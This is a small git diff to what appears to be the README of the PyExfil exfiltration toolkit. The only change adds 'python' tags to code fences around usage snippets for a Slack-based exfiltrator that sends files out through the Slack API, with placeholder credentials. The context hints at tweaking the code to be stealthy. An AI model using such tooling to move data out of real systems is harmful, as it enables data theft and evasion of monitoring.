@@ -93,7 +93,7 @@ FTPHand.get_file()
 Slack exfiltration uses the Slack API to move files around. Please notice you will need to tweak the code to make it stealthy. Right now it is defaultly designed to be noisy and appear on the user's log to make sure you're using this in a 'good' manner.
 
 #### Slack Server
-```
+```python
 from pyexfil.Slack.slack_server import SlackExfiltrator
 
 slackExf = SlackExfiltrator(slackSlaveID="11111FD", slackToken="xoxo-abc", encKey="Abc!23")
@@ -103,7 +103,7 @@ slackExf.Listen()
 
 #### Slack Client
 
-```
+```python
 from pyexfil.Slack.slack_server import SlackExfiltrator
 
 slackExf = SlackExfiltrator(slackID="11111FD", slackToken="xoxo-abc", encKey="Abc!23")
